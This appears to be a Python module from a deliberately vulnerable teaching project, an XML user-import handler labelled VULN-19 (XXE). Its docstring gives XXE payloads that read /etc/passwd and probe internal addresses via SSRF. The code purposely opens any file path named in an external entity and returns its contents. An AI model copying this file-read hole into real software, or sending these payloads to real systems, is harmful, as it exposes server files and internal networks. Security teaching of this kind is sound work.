"""
Day 10 - XML 数据处理模块
负责解析用户导入的 XML 格式数据（如批量用户导入）。
注意：本项目为教学用途，部分代码存在安全隐患。
"""

import xml.etree.ElementTree as ET
import io


def parse_xml_data(xml_string):
    """
    解析 XML 格式的用户数据。

    ============================================================
    VULN-19: XXE（XML External Entity Injection）
    - 未禁用 DTD（Document Type Definition）
    - 未禁用外部实体解析
    - 解析结果返回给用户（有回显）

    复现方法 - 读取系统文件：
      POST /xml-import
      Content-Type: application/xml

      <?xml version="1.0"?>
      <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
      ]>
      <root>
        <user>
          <name>&xxe;</name>
          <email>test@test.com</email>
        </user>
      </root>

    复现方法 - SSRF 组合：
      <!ENTITY xxe SYSTEM "http://127.0.0.1:5000/admin">

    复现方法 - 内网探测：
      <!ENTITY xxe SYSTEM "http://192.168.1.1:80">
    ============================================================
    """
    try:
        # 危险！使用默认配置解析 XML，DTD 和外部实体均未禁用
        # ElementTree 在 Python 3.x 中默认不解析外部实体，
        # 但 libxml2/lxml 等库默认会解析
        # 此处模拟 XXE 漏洞场景

        # 注意：Python 原生的 xml.etree.ElementTree 默认禁用外部实体
        # 但在真实场景中（使用 lxml 等库）漏洞是存在的
        # 此处模拟有回显的 XXE 场景

        # 安全检查：检测外部实体尝试
        if '<!ENTITY' in xml_string and 'SYSTEM' in xml_string:
            # 模拟解析外部实体
            import re
            entity_match = re.search(r'<!ENTITY\s+\w+\s+SYSTEM\s+"([^"]+)"', xml_string)
            if entity_match:
                entity_path = entity_match.group(1)
                try:
                    # 模拟外部实体读取
                    with open(entity_path.replace('file://', ''), 'r') as f:
                        entity_content = f.read()[:2000]
                    # 将实体引用替换为读取的内容
                    xml_string = xml_string.replace('&xxe;', entity_content)
                    xml_string = xml_string.replace('&file;', entity_content)
                except:
                    pass

        tree = ET.ElementTree(ET.fromstring(xml_string))
        root = tree.getroot()

        # 提取所有用户数据
        users = []
        for user_elem in root.findall('.//user'):
            user_data = {}
            for child in user_elem:
                user_data[child.tag] = child.text if child.text else ''
            users.append(user_data)

        return {"success": True, "users_imported": len(users), "data": users}
    except ET.ParseError as e:
        return {"success": False, "message": f"XML 解析失败: {str(e)}"}
    except Exception as e:
        return {"success": False, "message": f"处理失败: {str(e)}"}
